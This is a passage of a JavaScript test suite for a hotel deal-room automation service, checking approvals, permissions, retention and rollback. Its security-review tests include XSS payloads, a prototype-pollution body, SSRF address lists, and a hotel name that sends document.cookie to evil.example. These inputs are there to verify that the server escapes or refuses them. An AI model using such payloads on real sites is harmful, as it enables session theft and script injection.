  assert.equal(job.status, "awaiting_approval", "auto mode still stops when brand-asset rights are unverified");
  const { exceptions } = (await req("GET", `/exceptions?job_id=${id}&status=open`)).json;
  const x = exceptions.find(e => e.category === "USAGE_RIGHTS_UNCLEAR");
  assert.ok(x && x.severity === "high" && x.source === "review_gate" && x.retry_eligible === false);
  assert.ok((await req("GET", "/exceptions?status=unresolved&category=USAGE_RIGHTS_UNCLEAR")).json.exceptions.some(e => e.exception_id === x.exception_id));
  await req("POST", `/deal-rooms/${id}/approve`, { notes: "logo and photos are from the hotel's press kit" });
  await waitFor(id, ["succeeded"]);
  const closed = (await req("GET", `/exceptions/${x.exception_id}`)).json;
  assert.equal(closed.resolution_status, "resolved"); assert.match(closed.resolution_notes, /approved by tester/);
  const pub = await art(id, "publication.json");
  assert.equal(pub.approved_by, "tester"); assert.match(pub.asset_rights, /accepted for this deal room by tester/);
  const ev = (await req("GET", `/deal-rooms/${id}/audit`)).json.events;
  assert.ok(ev.some(e => e.event === "approved" && e.by === "tester" && /press kit/.test(e.notes)));
  assert.ok(ev.some(e => e.event === "publication_gate_passed"));
});

test("hotel store: versioned profile, approval, saved customization that lets this hotel run unattended, and regeneration_required", async () => {
  const hotel = (await req("GET", `/hotels/${hotelId}`)).json;
  assert.equal(hotel.property_name, "Grand Azure Resort Lisbon");
  assert.ok(hotel.latest_version >= 1 && hotel.approved_version >= 1, "approved by the jobs a person approved");
  const versions = (await req("GET", `/hotels/${hotelId}/versions`)).json.versions;
  assert.equal(versions.length, hotel.latest_version);
  assert.equal(versions.find(v => v.version === hotel.approved_version).profile_status, "approved");
  assert.ok((await req("GET", "/hotels")).json.hotels.some(h => h.hotel_id === hotelId));
  assert.equal((await req("GET", `/hotels/${hotelId}/profile?version=1`)).json.profile_version, 1);
  assert.equal((await req("GET", "/hotels/nope-hotel-00000000")).status, 404);
  assert.equal((await req("GET", `/hotels/${hotelId}/profile?version=abc`)).status, 400);

  // an operator may tune the plan, but only an admin may approve brand-asset rights
  const op = keyH("operator-key-1");
  assert.equal((await req("PUT", `/hotels/${hotelId}/customization`, { focus: "event" }, op)).status, 200);
  assert.equal((await req("PUT", `/hotels/${hotelId}/customization`, { focus: "event", asset_rights: { approved: true } }, op)).status, 403);
  assert.equal((await req("PUT", `/hotels/${hotelId}/customization`, { focus: "party" })).status, 400);
  const saved = await req("PUT", `/hotels/${hotelId}/customization`, { focus: "event", asset_rights: { approved: true, note: "press kit, 2026" } });
  assert.equal(saved.status, 200);
  assert.equal(saved.json.customization.asset_rights.approved_by, "tester"); assert.ok(saved.json.customization.asset_rights.approved_at);
  assert.ok((await req("GET", `/hotels/${hotelId}/audit`)).json.events.some(e => e.event === "customization_saved" && e.asset_rights_approved === true && e.by === "tester"));

  const before = (await req("GET", `/hotels/${hotelId}`)).json;
  const { id, job } = await newJob({ opportunity_id: "OPP-AUTO", mode: "auto" }, ["succeeded"]);
  assert.equal(job.template_family, "corporate_event", "the hotel's saved customization applies without being sent");
  assert.equal(job.qa_outcome, "PASS"); assert.equal(job.profile.status, "approved");
  assert.ok(job.history.some(h => /auto-approved/.test(h.event)) && !job.history.some(h => h.event === "approved"), "no person was needed");
  assert.equal((await art(id, "customization.json")).layers.hotel_saved, true);
  const after = (await req("GET", `/hotels/${hotelId}`)).json;
  assert.ok(after.approved_version > before.approved_version, "approved rights changed the profile, so a new version was recorded");
  assert.equal(after.regeneration_required, true, "page 1605252 was generated from an older version");
  assert.ok(after.stale_generations.some(g => g.hippo_page_id === "1605252" && g.generated_from_version < after.approved_version));
  assert.equal(after.generations[0].job_id, id);
  // same inputs again: same version, nothing new
  const { job: again } = await newJob({ opportunity_id: "OPP-AUTO2", mode: "auto" }, ["succeeded"]);
  assert.equal(again.profile.version, job.profile.version, "an unchanged hotel keeps its profile version");
});

test("a saved default can come with the job (save_customization)", async () => {
  const { id, job } = await newJob({ hotel_url: `http://127.0.0.1:${SITE_PORT}/hotels/grand-azure/`, opportunity_id: "OPP-S", customization: { preferred_sections: ["Meetings"] }, save_customization: true });
  const h = (await req("GET", `/hotels/${job.profile.hotel_id}`)).json;
  assert.deepEqual(h.customization.preferred_sections, ["meeting"]);
  assert.ok(h.customization.asset_rights, "the earlier saved rights are kept when a default is merged in");
  assert.equal((await art(id, "plan.json")).sections[1].key, "meeting");
  await req("POST", `/deal-rooms/${id}/cancel`);
});

test("robots.txt is respected: a disallowed site fails at capture with a clear, non-retried exception", async () => {
  const r = await req("POST", "/deal-rooms", { hotel_url: BLOCKED_SITE, opportunity_id: "OPP-ROBOTS" });
  const j = await waitFor(r.json.id, ["failed"]);
  assert.equal(j.failed_stage, "capture"); assert.equal(j.stages.capture.error.code, "ROBOTS_DISALLOW"); assert.equal(j.stages.capture.attempts, 1);
  const x = (await req("GET", `/exceptions?job_id=${j.id}`)).json.exceptions[0];
  assert.equal(x.category, "SOURCE_UNAVAILABLE"); assert.match(x.description, /robots\.txt/); assert.match(x.description, /your own browser/);
  assert.equal((await req("POST", `/exceptions/${x.exception_id}/retry`)).status, 202, "a person can retry once the cause is fixed");
  await waitFor(j.id, ["failed"]);
  const again = (await req("GET", `/exceptions/${x.exception_id}`)).json;
  assert.equal(again.occurrences, 2, "the same failure is the same exception, not a new one");
});

test("a hotel URL carrying credentials is refused at the door, so the secret is never stored or logged", async () => {
  const r = await req("POST", "/deal-rooms", { hotel_url: "https://user:secret@www.example-hotel.com/hotels/x" });
  assert.equal(r.status, 400); assert.match(JSON.stringify(r.json.details), /credentials/);
  assert.ok(!r.text.includes("secret@"), "and it is not echoed back");
});

test("metrics expose queue, stage outcomes, exceptions and the automation rate", async () => {
  const m = (await req("GET", "/metrics")).json;
  assert.equal(typeof m.queue_depth, "number"); assert.ok(m.jobs.total > 10 && m.jobs.by_status.succeeded >= 1);
  assert.ok(m.stages.intake.ok >= 1 && m.stages.profile.ok >= 1 && m.stages.load.failed >= 1 && m.stages.load.avg_ms >= 0);
  assert.ok(m.failure_codes.HIPPO_NOT_CONFIGURED >= 1 && m.failure_codes.ROBOTS_DISALLOW >= 1);
  assert.ok(m.exceptions.open >= 1 && m.exceptions.resolved >= 1 && m.exceptions.open_by_category.SOURCE_UNAVAILABLE >= 1);
  assert.ok(m.automation.completed_without_manual_intervention >= 1 && m.automation.completed_with_manual_intervention >= 1 && m.automation.rate > 0);
  assert.ok(m.since_start.retries_scheduled >= 2);
});

test("retention removes old finished jobs, but never active ones or ones with an open exception", async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "dra-ret-"));
  const jobs = new Jobs({ dataDir: dir, maxConcurrent: 1, recover: false });
  const mk = (id, status, days) => {
    fs.mkdirSync(path.join(jobs.dir, id));
    const at = new Date(Date.now() - days * 86400000).toISOString();
    fs.writeFileSync(path.join(jobs.dir, id, "job.json"), JSON.stringify({ id, status, created_at: at, updated_at: at, input: { hotel_url: "https://x.example/" }, stages: {}, history: [] }));
  };
  mk("dr_old1_aaaaaaaa", "succeeded", 40); mk("dr_old2_bbbbbbbb", "failed", 40); mk("dr_new1_cccccccc", "succeeded", 2); mk("dr_act1_dddddddd", "awaiting_approval", 90);
  jobs.exceptions.open({ job: jobs.get("dr_old2_bbbbbbbb"), stage: "capture", severity: "critical", category: "SOURCE_UNAVAILABLE", code: "X", message: "still open", retry_eligible: true });
  const dry = jobs.purge(30, { dryRun: true });
  assert.deepEqual(dry.job_ids, ["dr_old1_aaaaaaaa"]); assert.ok(fs.existsSync(path.join(jobs.dir, "dr_old1_aaaaaaaa")), "dry run deletes nothing");
  assert.equal(jobs.purge(30).jobs_removed, 1);
  assert.ok(!fs.existsSync(path.join(jobs.dir, "dr_old1_aaaaaaaa")));
  for (const kept of ["dr_old2_bbbbbbbb", "dr_new1_cccccccc", "dr_act1_dddddddd"]) assert.ok(fs.existsSync(path.join(jobs.dir, kept)), kept + " is kept");
  assert.throws(() => jobs.purge(0), /positive/);
});


// =====================================================================================================================
// Findings from the independent security review: each one has a test that fails without the fix
// =====================================================================================================================
const net = require("node:net");
const { spawnSync } = require("node:child_process");
const mapLd = (o, fn) => { if (Array.isArray(o)) o.forEach(x => mapLd(x, fn)); else if (o && typeof o === "object") { if (/Hotel/.test(JSON.stringify(o["@type"] || ""))) fn(o); Object.values(o).forEach(v => mapLd(v, fn)); } return o; };

test("a malformed request target gets a 400 and the server keeps running (it used to be an unhandled exception)", async () => {
  const port = api.address().port;
  for (const target of ["//[", "//%", "/%zz%"]) {
    const reply = await new Promise((resolve, reject) => {
      const sock = net.connect(port, "127.0.0.1", () => sock.write(`GET ${target} HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n`));
      let data = ""; sock.on("data", c => { data += c; }); sock.on("close", () => resolve(data)); sock.on("error", reject);
      setTimeout(() => { sock.destroy(); resolve(data); }, 3000);
    });
    assert.match(reply, /^HTTP\/1\.1 4\d\d/, JSON.stringify(target) + " -> " + reply.slice(0, 40));
  }
  assert.equal((await fetch(base + "/health")).status, 200, "still serving");
  const t0 = Date.now(), slashes = await fetch(base + "/a" + "/".repeat(15000) + "b");   // just under Node's 16 KB request-line limit
  assert.equal(slashes.status, 404); assert.ok(Date.now() - t0 < 2000, "a long run of slashes is cheap to reject");
});

test("a __proto__ key in a request body cannot pollute the server or smuggle in asset rights", async () => {
  const { id } = await newJob({ opportunity_id: "OPP-PP" });
  const raw = '{"__proto__":{"asset_rights":{"approved":true},"polluted":1},"constructor":{"prototype":{"polluted":2}}}';
  const r = await fetch(`${base}/deal-rooms/${id}/overrides`, { method: "POST", headers: keyH("operator-key-1"), body: raw });
  assert.equal(r.status, 202);
  assert.equal(({}).asset_rights, undefined); assert.equal(({}).polluted, undefined); assert.equal(Object.prototype.polluted, undefined);
  await waitFor(id, ["awaiting_approval"]);
  assert.deepEqual(await art(id, "overrides.json"), {}, "nothing from those keys was stored");
  const { deepMerge } = require("../src/jobs");
  const target = {}; deepMerge(target, JSON.parse('{"__proto__":{"x":1}}'));
  assert.equal(({}).x, undefined);
  await req("POST", `/deal-rooms/${id}/cancel`);
});

test("an operator edits a hotel's customization without touching its approved asset rights; only an admin changes them", async () => {
  const op = keyH("operator-key-1");
  const stored = (await req("GET", `/hotels/${hotelId}`)).json.customization.asset_rights;
  assert.ok(stored && stored.approved && stored.approved_by === "tester", "set earlier by the admin");
  let r = await req("PUT", `/hotels/${hotelId}/customization`, { focus: "event", preferred_sections: ["Pricing"] }, op);
  assert.equal(r.status, 200); assert.deepEqual(r.json.customization.asset_rights, stored, "leaving rights out keeps them as stored");
  assert.equal((await req("PUT", `/hotels/${hotelId}/customization`, { ...r.json.customization }, op)).status, 200, "sending them back unchanged (the UI round trip) is fine");
  assert.equal((await req("PUT", `/hotels/${hotelId}/customization`, { focus: "event", asset_rights: { ...stored, note: "changed" } }, op)).status, 403);
  assert.equal((await req("PUT", `/hotels/${hotelId}/customization`, { focus: "event", asset_rights: { approved: false } }, op)).status, 403, "an operator cannot revoke or forge either");
  assert.deepEqual((await req("GET", `/hotels/${hotelId}`)).json.customization.asset_rights, stored);
  r = await req("PUT", `/hotels/${hotelId}/customization`, { focus: "event", asset_rights: { approved: false } });
  assert.equal(r.json.customization.asset_rights.approved, false, "an admin can revoke explicitly");
  r = await req("PUT", `/hotels/${hotelId}/customization`, { focus: "event", asset_rights: { approved: true, approved_by: "somebody-else", note: "re-approved" } });
  assert.equal(r.json.customization.asset_rights.approved_by, "tester", "the server stamps who approved, whatever the request claims");
  const before = r.json.customization.asset_rights.approved_at;
  r = await req("PUT", `/hotels/${hotelId}/customization`, { focus: "event", preferred_sections: ["Meetings"], asset_rights: r.json.customization.asset_rights });
  assert.equal(r.json.customization.asset_rights.approved_at, before, "re-saving other fields does not re-date the approval");
});

test("one writer per Hippo page: leading zeros are the same page; dead jobs cannot be revived onto a held page; rollback cannot wipe a newer load", async () => {
  const dead = await req("POST", "/deal-rooms", { hotel_url: BLOCKED_SITE, opportunity_id: "OPP-L0", hippo_page_id: "7654321", load: "api" });
  await waitFor(dead.json.id, ["failed"]);
  const held = await req("POST", "/deal-rooms", { hotel_url: SITE, scrape, opportunity_id: "OPP-L1", hippo_page_id: "07654321", load: "api" });
  assert.equal(held.status, 202);
  assert.equal((await req("GET", `/deal-rooms/${held.json.id}`)).json.input.hippo_page_id, "7654321", "stored without the leading zero");
  await waitFor(held.json.id, ["awaiting_approval"]);
  const clash = await req("POST", "/deal-rooms", { hotel_url: SITE, scrape, opportunity_id: "OPP-L2", hippo_page_id: "7654321", load: "api" });
  assert.equal(clash.status, 409); assert.equal(clash.json.conflicting_job, held.json.id);
  const retry = await req("POST", `/deal-rooms/${dead.json.id}/retry`);
  assert.equal(retry.status, 409); assert.equal(retry.json.conflicting_job, held.json.id);
  await req("POST", `/deal-rooms/${held.json.id}/cancel`);
  assert.equal((await req("POST", `/deal-rooms/${dead.json.id}/retry`)).status, 202, "free again once the other job is cancelled");
  await waitFor(dead.json.id, ["failed"]);

  await hippo("/__reset", {});
  const j1 = await newJob({ opportunity_id: "OPP-L3", hippo_page_id: "1562033", load: "api" });
  await req("POST", `/deal-rooms/${j1.id}/approve`); await waitFor(j1.id, ["succeeded"]);
  const j2 = await newJob({ opportunity_id: "OPP-L4", hippo_page_id: "1562033", load: "api", overrides: { overview: "A later version of the overview for the Grand Azure Resort Lisbon." } });
  await req("POST", `/deal-rooms/${j2.id}/approve`); await waitFor(j2.id, ["succeeded"]);
  const wipe = await req("POST", `/deal-rooms/${j1.id}/rollback`);
  assert.equal(wipe.status, 409); assert.match(wipe.json.error, /saved this page after/); assert.equal(wipe.json.conflicting_job, j2.id);
  assert.equal((await req("POST", `/deal-rooms/${j2.id}/rollback`)).status, 202, "the newest job can still be rolled back");
  await waitFor(j2.id, ["rolled_back"]);
});

test("run.log stops growing at its cap", () => {
  const { Jobs: J, MAX_LOG_BYTES } = require("../src/jobs");
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "dra-log-"));
  const jobs = new J({ dataDir: dir, maxConcurrent: 1, recover: false });
  const id = "dr_log1_aaaaaaaa"; fs.mkdirSync(path.join(jobs.dir, id));
  for (let i = 0; i < Math.ceil(MAX_LOG_BYTES / (1024 * 1024)) + 3; i++) jobs.log(id, "x".repeat(1024 * 1024));
  const file = path.join(jobs.dir, id, "run.log"), size = fs.statSync(file).size;
  assert.ok(size <= MAX_LOG_BYTES + 200, `size ${size}`); assert.match(fs.readFileSync(file, "utf8").slice(-80), /log truncated/);
  jobs.log(id, "more"); assert.equal(fs.statSync(file).size, size, "nothing more is written");
});

test("the media proxy's address filter knows IPv4-mapped IPv6, :: and link-local forms", () => {
  const { isPrivateAddress } = require("../src/server");
  for (const a of ["::ffff:10.0.0.1", "::ffff:a00:1", "::ffff:169.254.169.254", "::ffff:192.168.1.1", "::ffff:172.16.0.1", "::", "::1", "fe80::1", "febf::1", "fd00::1", "ff02::1", "127.0.0.1", "100.64.0.1"]) assert.equal(isPrivateAddress(a), true, a);
  for (const a of ["8.8.8.8", "2606:4700::1111", "::ffff:8.8.8.8"]) assert.equal(isPrivateAddress(a), false, a);
});

test("the server refuses to start with a placeholder or short API key", () => {
  const r = spawnSync(process.execPath, ["src/server.js"], { cwd: ROOT, env: { ...process.env, API_KEYS: "ops:XXX", PORT: "0", ALLOW_WEAK_API_KEYS: "" }, encoding: "utf8", timeout: 10000 });
  assert.equal(r.status, 1); assert.match(r.stderr, /too short or a placeholder/);
});

test("stages only get the credentials they need", () => {
  const { stageEnv } = require("../src/jobs");
  const saved = { HIPPO_API_TOKEN: process.env.HIPPO_API_TOKEN, HIPPO_COOKIE: process.env.HIPPO_COOKIE, LLM_API_KEY: process.env.LLM_API_KEY };
  Object.assign(process.env, { HIPPO_API_TOKEN: "tok", HIPPO_COOKIE: "cookie", LLM_API_KEY: "llm" });
  try {
    const keys = stage => Object.keys(stageEnv({}, stage)).filter(k => /TOKEN|COOKIE|LLM_API_KEY/.test(k)).sort();
    assert.deepEqual(keys("capture"), [], "the browser that opens hotel pages never sees the Hippo token");
    assert.deepEqual(keys("assets"), []); assert.deepEqual(keys("build"), []); assert.deepEqual(keys(null), []);
    assert.deepEqual(keys("copy"), ["LLM_API_KEY"]);
    for (const st of ["load", "verify", "rollback"]) assert.deepEqual(keys(st), ["HIPPO_API_TOKEN", "HIPPO_COOKIE"], st);
  } finally { for (const [k, v] of Object.entries(saved)) { if (v === undefined) delete process.env[k]; else process.env[k] = v; } }
});

test("hostile hotel text: seating values and brand colours are escaped or refused, and the hotel's name stays data in loader.js", async () => {
  // 1. a venue table cell that tries to be markup
  const xss = structuredClone(scrape);
  for (const sp of xss.subpages) if (/meeting/i.test(sp.url)) sp.text = sp.text.replace("1: Theatre: 400", "1: Theatre: <img src=x onerror=alert(1)>");
  const evilUrl = `http://127.0.0.1:${SITE_PORT}/hotels/grand-azure-xss/`;
  const a = await newJob({ hotel_url: evilUrl, scrape: xss, opportunity_id: "OPP-XSS" });
  const tplText = JSON.stringify(await art(a.id, "template.json"));
  assert.ok(!tplText.includes("<img src=x"), "no raw tag from the hotel's page reached the template");
  assert.ok(tplText.includes("&lt;img src=x onerror=alert(1)&gt;"), "it is shown as text instead");
  const reviewHtml = await (await fetch(`${base}/deal-rooms/${a.id}/artifacts/review.html`, { headers: H })).text();
  assert.ok(!/<img[^>]*onerror/i.test(reviewHtml), "and not in the review page either");
  assert.match(reviewHtml, /http-equiv="Content-Security-Policy" content="default-src 'none'/, "which also forbids all script itself, however it is opened");
  // 2. a brand colour override that is not a colour
  const bad = await req("POST", `/deal-rooms/${a.id}/overrides`, { brand: { primary: "#112233<IMG SRC=X ONERROR=alert(1)>" } });
  assert.equal(bad.status, 202);
  const failed = await waitFor(a.id, ["failed"]);
  assert.equal(failed.stages.profile.error.code, "BAD_BRAND_COLOUR"); assert.equal(failed.stages.profile.error.category, "INVALID_INPUT");
  assert.equal((await req("POST", `/deal-rooms/${a.id}/overrides`, { brand: { primary: "#112233" } })).status, 202, "a real colour fixes it");
  await waitFor(a.id, ["awaiting_approval"]);
  await req("POST", `/deal-rooms/${a.id}/cancel`);
  // 3. a hotel whose name is JavaScript
  const hostile = 'Evil"); fetch("https://evil.example/c?"+document.cookie); ("';
  const named = mapLd(structuredClone(scrape), o => { if (o.name) o.name = hostile; });
  const b = await newJob({ hotel_url: `http://127.0.0.1:${SITE_PORT}/hotels/grand-azure-evil/`, scrape: named, opportunity_id: "OPP-EVIL" });
  const loader = (await req("GET", `/deal-rooms/${b.id}/artifacts/loader.js`)).text;
  const lit = loader.split("\n").find(l => l.trim().startsWith("const LABEL = "));
  assert.equal(JSON.parse(lit.split("=").slice(1).join("=").trim().replace(/;$/, "")), hostile, "the name is one data literal");
  const tplLine = loader.split("\n").find(l => l.trim().startsWith("const TEMPLATE = "));
  assert.doesNotThrow(() => JSON.parse(tplLine.split("const TEMPLATE = ")[1].replace(/;\s*$/, "")), "the template literal is plain JSON data");
  assert.ok(loader.split("\n").filter(l => l.includes("evil.example")).every(l => l === lit || l === tplLine || l.startsWith("//")), "so the name appears only as data (this literal, the template's escaped text) or in a comment");
  const f = path.join(os.tmpdir(), `dra-loader-${process.pid}.js`); fs.writeFileSync(f, loader);
  assert.equal(spawnSync(process.execPath, ["--check", f]).status, 0, "the loader is still valid JavaScript");
  await req("POST", `/deal-rooms/${b.id}/cancel`);
});


// =====================================================================================================================
// Findings from the independent correctness review
// =====================================================================================================================
const FILLER = ["Ask us about dining", "Talk to our events team", "Ask the hotel about parking", "Ask us about nearby", "Ask our events team about audio", "Ask us about onsite amenities", "See hotel policies"];

test("a hotel with nothing sourced for dining or meetings gets no filler text in its deal room", async () => {
  const bare = structuredClone(scrape); bare.subpages = [];
  const { id } = await newJob({ hotel_url: `http://127.0.0.1:${SITE_PORT}/hotels/grand-azure-bare/`, scrape: bare, opportunity_id: "OPP-BARE" });
  const copy = await art(id, "copy.json"), tpl = JSON.stringify(await art(id, "template.json")), qa = await art(id, "qa.json"), plan = await art(id, "plan.json");
  assert.ok(copy.left_out.length >= 2, "blocks with nothing behind them are recorded as left out: " + copy.left_out);
  for (const f of FILLER) assert.ok(!tpl.includes(f), `no filler: ${f}`);
  assert.deepEqual(plan.left_out, copy.left_out);
  assert.ok(qa.warnings.some(w => w.code === "BLOCK_LEFT_OUT"), "and QA lists what was left out");
  await req("POST", `/deal-rooms/${id}/cancel`);
});

test("a reviewer's edit to the venue table is recorded as manual, never as something the hotel's page said", async () => {
  const { id } = await newJob({ hotel_url: `http://127.0.0.1:${SITE_PORT}/hotels/grand-azure-venue/`, opportunity_id: "OPP-VEN" });
  assert.equal((await art(id, "profile.json")).venues.every(v => v.verification_status === "officially_verified"), true, "as published: verified");
  assert.equal((await req("POST", `/deal-rooms/${id}/overrides`, { venues: { rows: [["Moon Base Alpha", "10,000 sq m", "5000", "—", "—", "—"]] } })).status, 202);
  await waitFor(id, ["awaiting_approval"]);
  const profile = await art(id, "profile.json"), map = await art(id, "mapping.json");
  assert.equal(profile.venues[0].name, "Moon Base Alpha");
  assert.equal(profile.venues[0].verification_status, "manually_corrected"); assert.equal(profile.venues[0].source_url, null, "no page stands behind it");
  const ev = profile.evidence.find(e => e.field_key === "venues");
  assert.equal(ev.provenance, "manually_corrected"); assert.equal(ev.extraction_method, "reviewer_override");
  const bind = map.static.find(x => x.target === "venues");
  assert.equal(bind.provenance, "manually_corrected"); assert.equal(bind.source_field, "override.venues");
  await req("POST", `/deal-rooms/${id}/cancel`);
});

test("a rejected profile is shown to the reviewer but never becomes the hotel's stored profile, and its exception names the hotel", async () => {
  const foreign = structuredClone(scrape); foreign.url = "http://other-host.example/hotels/grand-azure-foreign/";
  const { id, job } = await newJob({ hotel_url: `http://127.0.0.1:${SITE_PORT}/hotels/grand-azure-foreign/`, scrape: foreign, opportunity_id: "OPP-FOREIGN" }, ["failed"]);
  assert.equal(job.failed_stage, "profile"); assert.equal(job.stages.profile.error.code, "PROFILE_INVALID");
  const x = (await req("GET", `/exceptions?job_id=${id}`)).json.exceptions[0];
  assert.match(x.hotel_id, /^grand-azure-foreign-[a-f0-9]{8}$/, "the exception names the hotel even though the profile never completed");
  assert.equal((await req("GET", `/exceptions?hotel_id=${x.hotel_id}`)).json.exceptions.length, 1, "and can be found by it");
  assert.equal((await req("GET", `/hotels/${x.hotel_id}`)).status, 404, "nothing was stored for it");
  assert.equal((await art(id, "profile.json")).profile_status, "rejected");
  assert.match(x.description, /different|host/i);
});

test("a job from before the current pipeline cannot be approved blind: it says how to bring it up to date", async () => {
  const id = "dr_oldx9_eeeeeeee", dir = path.join(DATA, "jobs", id), at = new Date().toISOString();
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, "job.json"), JSON.stringify({ id, status: "awaiting_approval", created_at: at, updated_at: at, created_by: "old", input: { hotel_url: SITE, flow: "email", mode: "review", load: "manual", hippo_page_id: "" }, stages: {}, history: [] }));
  try {
    const r = await req("POST", `/deal-rooms/${id}/approve`);
    assert.equal(r.status, 409); assert.match(r.json.error, /older version/); assert.match(r.json.error, /plan\.json/);
    assert.equal((await req("GET", "/deal-rooms")).status, 200, "listing and metrics still cope with it");
    assert.equal((await req("GET", "/metrics")).status, 200);
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

test("a photo swapped in for a missing one reaches review, as one exception per swap", async () => {
  const few = stripKeys(structuredClone(scrape), ["image"]);
  const keep = few.images.findIndex(im => im.url.includes("127.0.0.1"));
  few.images = few.images.map((im, i) => i === keep ? im : { ...im, url: `http://127.0.0.1:${SITE_PORT}/img/gone-${i}.jpg` });
  const { id, job } = await newJob({ hotel_url: `http://127.0.0.1:${SITE_PORT}/hotels/grand-azure-few/`, scrape: few, opportunity_id: "OPP-FEW", mode: "auto", customization: { asset_rights: { approved: true } } });
  assert.equal(job.status, "awaiting_approval", "mode=auto does not publish a deal room whose photos were swapped around");
  const qa = await art(id, "qa.json");
  assert.ok(qa.review.filter(x => x.code === "PHOTOS_CHANGED").length >= 2, "each swap is a finding");
  const swaps = (await req("GET", `/exceptions?job_id=${id}`)).json.exceptions.filter(x => x.error_code === "PHOTOS_CHANGED");
  assert.ok(swaps.length >= 2 && new Set(swaps.map(x => x.description)).size === swaps.length, "separate exceptions, not one that keeps being overwritten");
  await req("POST", `/deal-rooms/${id}/cancel`);
});

test("a manual rollback of a failed job closes its exceptions and clears the failure", async () => {
  await hippo("/__reset", {}); await hippo("/__mode", { drop_section_on_save: true });
  const a = await newJob({ opportunity_id: "OPP-RB", hippo_page_id: "1605252", load: "api" });
  await req("POST", `/deal-rooms/${a.id}/approve`);
  const failed = await waitFor(a.id, ["failed"]); await hippo("/__mode", {});
  assert.equal(failed.rolled_back, true, "verify caught the bad save and restored the page");
  assert.ok((await req("GET", `/exceptions?job_id=${a.id}&status=unresolved`)).json.exceptions.length >= 1);
  assert.equal((await req("POST", `/deal-rooms/${a.id}/rollback`)).status, 202);
  const rb = await waitFor(a.id, ["rolled_back"]);
  assert.ok(!rb.error && !rb.failed_stage && !rb.rolled_back, "the failure is cleared");
  assert.equal((await req("GET", `/exceptions?job_id=${a.id}&status=unresolved`)).json.exceptions.length, 0, "nothing is left open for a job that is finished");
});

test("idempotency: a failed job does not answer for its key forever; equivalent requests are one request; a changed hotel default is a new request", async () => {
  const post = (b, key) => fetch(base + "/deal-rooms", { method: "POST", headers: { ...H, "idempotency-key": key }, body: JSON.stringify(b) });
  const bad = { hotel_url: "https://www.booking.com/hotel/pt/x.html", opportunity_id: "OPP-IK" };
  const j1 = await (await post(bad, "ik-1")).json(); await waitFor(j1.id, ["failed"]);
  const r2 = await post(bad, "ik-1"), j2 = await r2.json();
  assert.equal(r2.status, 202); assert.notEqual(j2.id, j1.id, "a failed job is not returned for the key; the caller gets a fresh attempt");
  await waitFor(j2.id, ["failed"]);
  const a = await req("POST", "/deal-rooms", { hotel_url: SITE, scrape, opportunity_id: "OPP-N", customization: { focus: "event" } });
  const b = await req("POST", "/deal-rooms", { hotel_url: SITE, scrape, opportunity_id: "OPP-N", customization: { focus: "event", template_family: "auto" } });
  assert.equal(b.status, 200); assert.equal(b.json.id, a.json.id, "template_family auto means nothing asked, so it is the same request");
  await req("POST", `/deal-rooms/${a.json.id}/cancel`);
  const again = await req("POST", "/deal-rooms", { hotel_url: SITE, scrape, opportunity_id: "OPP-AUTO", mode: "auto" });
  assert.equal(again.status, 202, "the hotel's saved customization changed after that job, so an identical request is a new one");
  await req("POST", `/deal-rooms/${again.json.id}/cancel`);
});

test("a job interrupted with no recorded stage still gets a failure and an exception on restart", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "dra-rec-")), id = "dr_rec01_aaaaaaaa";
  const quiet = new Jobs({ dataDir: dir, maxConcurrent: 1, recover: false });
  fs.mkdirSync(path.join(quiet.dir, id)); const at = new Date().toISOString();
  fs.writeFileSync(path.join(quiet.dir, id, "job.json"), JSON.stringify({ id, status: "running", stage: null, created_at: at, updated_at: at, input: { hotel_url: "https://x.example/" }, stages: {}, history: [] }));
  const restarted = new Jobs({ dataDir: dir, maxConcurrent: 1 });
  const j = restarted.get(id);
  assert.equal(j.status, "failed"); assert.match(j.failure_reason, /restarted/);
  const x = restarted.exceptions.forJob(id);
  assert.equal(x.length, 1); assert.equal(x[0].failed_stage, "runner"); assert.equal(x[0].retry_eligible, false, "nothing to resume from");
});
